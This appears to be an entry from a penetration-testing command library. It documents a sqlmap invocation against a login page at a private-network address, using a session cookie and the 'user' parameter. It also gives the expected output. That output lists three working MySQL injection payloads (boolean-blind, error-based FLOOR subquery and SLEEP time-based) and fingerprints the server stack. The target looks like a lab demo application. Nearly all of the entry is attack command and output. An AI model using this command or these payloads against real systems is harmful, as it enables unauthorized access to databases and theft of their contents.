---
id: d05ecaca-eb25-48b1-a76e-1e03ce981bc6
name: SQLMap Command With Session ID
type: command
executor: ''
data: sqlmap -u "http://192.168.1.10/vcart/login.php?user=demo@vcart.com&pass=demo&selop=2"
  --cookie='SESSION_ID=51feo6qnix2ct7k' -p user
output: "        ___\n       __H__\n ___ ___[)]_____ ___ ___  {1.2.7#stable}\n|_ -|\
  \ . [']     | .'| . |\n|___|_  [']_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\
  \n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual\
  \ consent is illegal. It is the end user's responsibility to obey all applicable\
  \ local, state and federal laws. Developers assume no liability and are not responsible\
  \ for any misuse or damage caused by this program\n\n[*] starting at 21:22:15\n\n\
  [21:22:16] [INFO] resuming back-end DBMS 'mysql' \n[21:22:16] [INFO] testing connection\
  \ to the target URL\nsqlmap got a 302 redirect to 'http://192.168.1.10:80/vcart/home.php'.\
  \ Do you want to follow? [Y/n] y\nsqlmap resumed the following injection point(s)\
  \ from stored session:\n---\nParameter: user (GET)\n    Type: boolean-based blind\n\
  \    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: user=demo@vcart.com'\
  \ AND 5118=5118 AND 'vzLg'='vzLg&pass=demo&selop=2\n\n    Type: error-based\n  \
  \  Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause\
  \ (FLOOR)\n    Payload: user=demo@vcart.com' AND (SELECT 4424 FROM(SELECT COUNT(*),CONCAT(0x7171627171,(SELECT\
  \ (ELT(4424=4424,1))),0x717a6b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS\
  \ GROUP BY x)a) AND 'QcSB'='QcSB&pass=demo&selop=2\n\n    Type: AND/OR time-based\
  \ blind\n    Title: MySQL >= 5.0.12 AND time-based blind\n    Payload: user=demo@vcart.com'\
  \ AND SLEEP(5) AND 'nDDN'='nDDN&pass=demo&selop=2\n---\n[21:22:18] [INFO] the back-end\
  \ DBMS is MySQL\nweb application technology: Apache 2.4.41, PHP 7.1.32\nback-end\
  \ DBMS: MySQL >= 5.0\n[21:22:18] [INFO] fetched data logged to text files under\
  \ '/root/.sqlmap/output/192.168.1.10'\n\n[*] shutting down at 21:22:18\n"
created_at: '2020-09-02T17:47:10.124588+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# SQLMap Command With Session ID

```bash
sqlmap -u "http://192.168.1.10/vcart/login.php?user=demo@vcart.com&pass=demo&selop=2" --cookie='SESSION_ID=51feo6qnix2ct7k' -p user
```

## Expected Output

```
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.2.7#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 21:22:15

[21:22:16] [INFO] resuming back-end DBMS 'mysql' 
[21:22:16] [INFO] testing connection to the target URL
sqlmap got a 302 redirect to 'http://192.168.1.10:80/vcart/home.php'. Do you want to follow? [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: user=demo@vcart.com' AND 5118=5118 AND 'vzLg'='vzLg&pass=demo&selop=2

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: user=demo@vcart.com' AND (SELECT 4424 FROM(SELECT COUNT(*),CONCAT(0x7171627171,(SELECT (ELT(4424=4424,1))),0x717a6b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'QcSB'='QcSB&pass=demo&selop=2

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: user=demo@vcart.com' AND SLEEP(5) AND 'nDDN'='nDDN&pass=demo&selop=2
---
[21:22:18] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.41, PHP 7.1.32
back-end DBMS: MySQL >= 5.0
[21:22:18] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.1.10'

[*] shutting down at 21:22:18

```
